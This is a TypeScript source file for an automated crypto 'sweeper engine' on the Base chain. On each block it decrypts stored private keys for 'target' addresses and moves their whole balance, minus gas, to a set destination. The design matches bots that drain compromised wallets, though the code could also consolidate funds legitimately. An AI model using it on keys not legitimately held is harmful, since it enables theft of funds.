import { createPublicClient, createWalletClient, webSocket, http, fallback, formatEther } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { base } from 'viem/chains'; // Change this to your target chain
import * as dotenv from 'dotenv';
import { redis } from '../config/db';
import { decryptKey } from './encryption';

dotenv.config();

// Accept a comma-separated list of URLs from Railway variables
// Example: WSS_URLS="wss://alchemy-url...,wss://infura-url...,wss://publicnode-url..."
const rawWssUrls = process.env.WSS_URLS;
if (!rawWssUrls) throw new Error("Missing WSS_URLS environment variable");

const wssUrls = rawWssUrls.split(',').map(url => url.trim());
const httpUrls = wssUrls.map(url => url.replace('wss://', 'https://'));

// Create an array of WebSocket transports
const wssTransports = wssUrls.map(url => webSocket(url));
const httpTransports = httpUrls.map(url => http(url));

// The engine will now automatically rotate through these providers if one fails
const publicClient = createPublicClient({
    chain: base,
    transport: fallback(wssTransports)
});

const broadcastClient = createWalletClient({
    chain: base,
    transport: fallback(httpTransports)
});

export const startSweeperEngine = async () => {
    console.log(`⚡️ Execution Engine Online: Watching with ${wssUrls.length} RPC providers...`);

    publicClient.watchBlocks({
        onBlock: async (block) => {
            try {
                const keys = await redis.keys('target:*');
                if (keys.length === 0) return;

                await Promise.all(keys.map(async (redisKey) => {
                    const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                    
                    const balance = await publicClient.getBalance({ address: targetAddress });
                    if (balance === 0n) return;

                    const targetData = await redis.hgetall(redisKey);
                    if (!targetData || !targetData.encryptedKey) return;

                    const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                    const account = privateKeyToAccount(privateKey);
                    const destination = targetData.destination as `0x${string}`;

                    const gasPrice = await publicClient.getGasPrice();
                    const gasLimit = 21000n;
                    const txFee = gasPrice * gasLimit;

                    if (balance <= txFee) return;

                    const sweepAmount = balance - txFee;

                    const txHash = await broadcastClient.sendTransaction({
                        account,
                        to: destination,
                        value: sweepAmount,
                        gas: gasLimit,
                        gasPrice: gasPrice,
                    });

                    console.log(`✅ SWEPT! Sent ${formatEther(sweepAmount)} to ${destination}. TX: ${txHash}`);
                }));
            } catch (error) {
                console.error("[Engine Error] Block processing failed:", error);
            }
        }
    });
};
